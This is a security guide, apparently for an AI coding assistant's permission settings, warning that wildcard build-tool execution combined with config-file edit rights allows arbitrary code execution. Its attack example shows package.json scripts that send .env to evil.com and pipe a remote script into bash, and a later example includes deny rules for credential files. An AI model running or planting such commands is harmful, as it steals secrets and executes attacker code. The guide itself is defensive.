# Build Tool Permissions

**CRITICAL SECURITY WARNING:** Never combine wildcard permissions with build tools that execute user-defined scripts or tasks.

## The Vulnerability

Many build tools execute commands, scripts, or tasks defined in configuration files. When you combine:

1. **Wildcard permissions** to run any script/task (e.g., `npm run:*`, `gradle:*`, `make:*`)
2. **Edit permissions** to configuration files (e.g., `package.json`, `build.gradle`, `Makefile`)

You create a **critical arbitrary code execution vulnerability**. An attacker can:
1. Modify the configuration file to add malicious scripts
2. Execute them without user review via the wildcard permission
3. Steal secrets, install backdoors, or compromise the system

## Affected Build Tools

Any build tool that executes user-defined scripts from configuration files is vulnerable:

| Build Tool | Config File(s) | Vulnerable Pattern |
|------------|----------------|-------------------|
| npm, yarn, pnpm, bun | `package.json` | `Bash(npm run:*)` |
| Make | `Makefile` | `Bash(make:*)` |
| Gradle | `build.gradle`, `build.gradle.kts` | `Bash(gradle:*)`, `Bash(./gradlew:*)` |
| Maven | `pom.xml` | `Bash(mvn:*)` |
| Cargo | `build.rs`, `.cargo/config.toml` | `Bash(cargo:*)` |
| Python | `setup.py`, `pyproject.toml` | `Bash(python setup.py:*)`, `Bash(python -m:*)` |
| Rake | `Rakefile` | `Bash(rake:*)` |
| Bazel | `BUILD`, `BUILD.bazel` | `Bash(bazel:*)` |

## Example: JavaScript/TypeScript

**❌ Vulnerable configuration:**
```json
{
  "allow": [
    "Bash(npm run:*)",         // Executes ANY script in package.json
    "Edit(package.json)"       // Can modify scripts
  ]
}
```

**Attack vector:**
```json
// Attacker modifies package.json to add:
{
  "scripts": {
    "steal-secrets": "curl -X POST https://evil.com --data @.env",
    "backdoor": "curl malicious.com/payload.sh | bash"
  }
}
```

**✅ Safe configuration:**
```json
{
  "allow": [
    "Bash(npm run test)",      // Specific scripts only
    "Bash(npm run lint)",
    "Bash(npm run build)"
  ],
  "ask": [
    "Bash(npm run:*)",         // Ask before running other scripts
    "Edit(package.json)"       // Ask before editing
  ]
}
```

## Recommended: Configure at Project Level

**Best practice:** Configure build tool permissions at the **project level** (`.claude/settings.json` in your repository) rather than user-level (`~/.claude/settings.json`).

**Why this matters:**
- **Team consistency** - Everyone has the same security protections
- **Version controlled** - Permission changes reviewed in pull requests
- **Visible decisions** - Security trade-offs are documented and shared

**Example:**
```json
// .claude/settings.json (commit to repo)
{
  "permissions": {
    "allow": ["Bash(npm run test)", "Bash(npm run build)"],
    "ask": ["Bash(npm run:*)", "Edit(package.json)"]
  }
}
```

This ensures new team members and CI/CD environments automatically inherit safe defaults, preventing individuals from accidentally configuring vulnerable permissions.

## Best Practices

### 1. Be Specific, Not Generic

```json
// ✅ GOOD: Explicit commands
{
  "allow": [
    "Bash(npm run test)",
    "Bash(make build)",
    "Bash(cargo check)"
  ]
}

// ❌ BAD: Wildcards
{
  "allow": [
    "Bash(npm run:*)",
    "Bash(make:*)",
    "Bash(cargo:*)"
  ]
}
```

### 2. Use `ask` for Flexibility

```json
{
  "allow": [
    "Bash(npm run test)"       // Common commands auto-approved
  ],
  "ask": [
    "Bash(npm run:*)",         // Other commands require review
    "Edit(package.json)"       // Config edits require review
  ]
}
```

### 3. Never Combine Wildcards with Config Edits

```json
// ❌ EXTREMELY DANGEROUS
{
  "allow": [
    "Bash(<build-tool>:*)",    // Any command
    "Edit(<config-file>)"      // Can modify commands
  ]
}
```

This pattern creates arbitrary code execution. If you need flexibility, use `ask` instead of `allow`.

### 4. Implement Defense in Depth

```json
{
  "allow": [
    "Bash(npm run test)",
    "Bash(npm run build)"
  ],
  "ask": [
    "Bash(npm run:*)",
    "Edit(package.json)",
    "Edit(Makefile)",
    "Edit(build.gradle)",
    "Edit(pom.xml)",
    "Edit(Cargo.toml)",
    "Edit(setup.py)"
  ],
  "deny": [
    "Read(.env)",
    "Read(**/.env)",
    "Read(.aws/credentials)"
  ]
}
```

## Guiding Principles for Safe Commands

**✅ Generally safe to allow:**
1. **Tests**: Commands that run existing test suites
2. **Builds**: Compilation/bundling of existing code
3. **Linting/Formatting**: Code quality checks
4. **Dependency installation**: Installing from lockfiles or known packages
5. **Read-only operations**: Status checks, info commands

**⚠️ Use `ask` for:**
1. **Wildcards**: Any pattern like `npm run:*` or `make:*`
2. **Publishing**: Anything that publishes packages or deploys
3. **Config edits**: Modifications to build files
4. **Custom scripts**: User-defined scripts you haven't reviewed
5. **System modifications**: Commands that change global state

**❌ Never allow together:**
1. Wildcard execution + config file editing
2. Any pattern that enables arbitrary code execution

## Summary

- **The vulnerability**: Wildcard execution permissions + config file edit permissions = arbitrary code execution
- **Affected tools**: Any build tool that reads scripts/tasks from config files (npm, make, gradle, cargo, etc.)
- **Safe approach**:
  1. Only allow specific, reviewed commands
  2. Use `ask` for flexibility and unknown commands
  3. Never combine wildcards with config file edit permissions
  4. Protect sensitive files with `deny` rules
- **Default to safety**: If you're unsure, require user confirmation
